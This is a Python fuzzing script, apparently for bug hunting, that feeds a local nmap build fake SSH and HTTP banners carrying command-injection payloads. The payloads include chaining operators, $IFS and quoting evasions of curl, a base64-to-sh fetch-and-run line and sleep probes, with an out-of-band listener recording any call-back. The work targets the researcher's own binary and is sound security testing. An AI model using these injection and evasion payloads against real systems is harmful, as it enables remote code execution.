#!/usr/bin/env python3
"""
GHOST OOB COMMAND EXECUTION DETECTOR — out-of-band detection per the user's
researched methodology (portswigger/commix/OWASP-style).

Kung may kahit isang path sa nmap na nag-e-execute ng command mula sa banner
data, MAHUHULI ito: ang banner ay nagdadala ng OOB payload (curl/nc/
nslookup pabalik sa listener natin). Kahit BLIND execution, darating ang
connection.

Techniques applied:
  1. Direct chaining: ; && || | ` $()
  2. $IFS space-bypass: cat$IFS..., curl$IFS...
  3. Quote/backslash/wildcard evasion: c'u'rl, cu\\rl, /usr/bin/c?rl
  4. Base64 piping: echo <b64> | base64 -d | sh
  5. Time-based: sleep payloads (latency check)
"""
import base64
import json
import os
import socket
import subprocess
import sys
import threading
import time

NMAP = "/home/dave/deepseek-harness/default-workspace/nmap_experiment/nmap/nmap"
OOB_PORT = 19777
LISTENER_LOG = "/home/dave/workspace/ghost_platform/oob_hits.log"

class OOBListener:
    """Listens for ANY connection — proof of command execution."""
    def __init__(self, port):
        self.port = port
        self.hits = []
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", port))
        self.srv.listen(16)
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while self.running:
            try:
                self.srv.settimeout(1.0)
                conn, addr = self.srv.accept()
                data = conn.recv(1024)
                self.hits.append({"time": time.time(), "addr": addr, "data": data[:200]})
                with open(LISTENER_LOG, "a") as f:
                    f.write(f"[{time.strftime('%H:%M:%S')}] OOB HIT from {addr}: {data[:200]!r}\n")
                conn.close()
            except socket.timeout:
                continue
            except OSError:
                return

    def stop(self):
        self.running = False

# The reverse-shell-capable payload target: our listener URL/PORT
URL = f"http://127.0.0.1:{OOB_PORT}/GHOST_PWNED"
B64 = base64.b64encode(f"curl {URL}".encode()).decode()

PAYLOADS = [
    # 1. direct chaining (banner-position: inside matched version field)
    ("direct_semi",      f";curl {URL}".encode()),
    ("direct_andand",    f"&&curl {URL}".encode()),
    ("direct_oror",      f"||curl {URL}".encode()),
    ("direct_pipe",      f"|curl {URL}".encode()),
    ("direct_backtick",  f"`curl {URL}`".encode()),
    ("direct_dollar",    f"$(curl {URL})".encode()),
    ("direct_newline",   f"\ncurl {URL}\n".encode()),
    # 2. $IFS bypass (no spaces)
    ("ifs_dollar",       f";curl$IFS{URL}".encode()),
    ("ifs_brace",        f";curl${{IFS}}{URL}".encode()),
    ("ifs_redirect",     f";curl<{URL}".encode()),
    # 3. evasion forms
    ("evade_quotes",     f";c'u'rl {URL}".encode()),
    ("evade_backslash",  f";cu\\rl {URL}".encode()),
    ("evade_wildcard",   f";/usr/bin/c?rl {URL}".encode()),
    ("evade_envvar",     f";$IFS".encode()),
    # 4. base64 piping
    ("b64_pipe",         f";echo {B64}|base64 -d|sh".encode()),
    # 5. time-based
    ("time_sleep",       b";sleep 8"),
    ("time_andand",      b"&&sleep 8"),
    # nslookup variant
    ("dns_nslookup",     f";nslookup 127.0.0.1".encode()),
]

def banner_server(port, banner):
    code = f'''
import socket, threading
banner = {banner!r}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", {port})); s.listen(16)
def h(c):
    try:
        c.settimeout(5); c.sendall(banner)
        try: c.recv(2048)
        except Exception: pass
        c.sendall(banner)
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = s.accept()
    threading.Thread(target=h, args=(conn,), daemon=True).start()
'''
    return subprocess.Popen([sys.executable, "-c", code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_nmap(args, timeout=120):
    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=0")
    try:
        t0 = time.time()
        p = subprocess.run([NMAP] + args, capture_output=True, timeout=timeout,
                            env=env, text=True)
        return p.returncode, time.time() - t0, "ERROR: AddressSanitizer" in (p.stdout + p.stderr), p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return -1, timeout, False, "TIMEOUT"

def main():
    listener = OOBListener(OOB_PORT)
    print(f"[*] OOB listener on 127.0.0.1:{OOB_PORT} — command-exec proof detector", flush=True)
    port = 18903
    total = 0
    oob_hits = []
    slow = []

    def attack(name, payload, target="ssh"):
        nonlocal total
        total += 1
        if target == "ssh":
            banner = b"SSH-2.0-Host" + payload + b"\r\n"
        else:
            banner = b"HTTP/1.1 200 OK\r\nServer: nginx/1.0" + payload + b"\r\n\r\n"
        proc = banner_server(port, banner)
        time.sleep(0.5)
        rc, dur, asan, out = run_nmap(["-Pn", "-p", str(port), "-sV",
                                      "--version-intensity", "9",
                                      "--host-timeout", "90s", "127.0.0.1"])
        hit = len(listener.hits)
        status = "*** OOB HIT ***" if hit else ("*** SLOW ***" if dur > 12 else "clean")
        print(f"[{total:2d}] {name:20s} dur={dur:5.1f}s oob={hit} asan={asan} {status}", flush=True)
        if hit:
            oob_hits.append({"name": name, "hits": listener.hits[:], "payload": payload.decode(errors="replace")})
            listener.hits.clear()
        if dur > 12:
            slow.append({"name": name, "dur": dur})
        proc.terminate(); proc.wait()

    for name, payload in PAYLOADS:
        attack(name, payload, "ssh")
    # http banner variants for the most likely executors
    for name, payload in PAYLOADS[:7]:
        attack(f"http_{name}", payload, "http")

    listener.stop()
    print(f"\n[*] OOB BATTERY DONE: {total} attacks, {len(oob_hits)} OOB hits, {len(slow)} slow", flush=True)
    if oob_hits:
        print("*** COMMAND EXECUTION PROVEN — mayaman na tayo! ***")
    with open("/home/dave/workspace/ghost_platform/oob_battery_report.json", "w") as f:
        json.dump({"total": total, "oob_hits": oob_hits, "slow": slow}, f, indent=2)

if __name__ == "__main__":
    main()
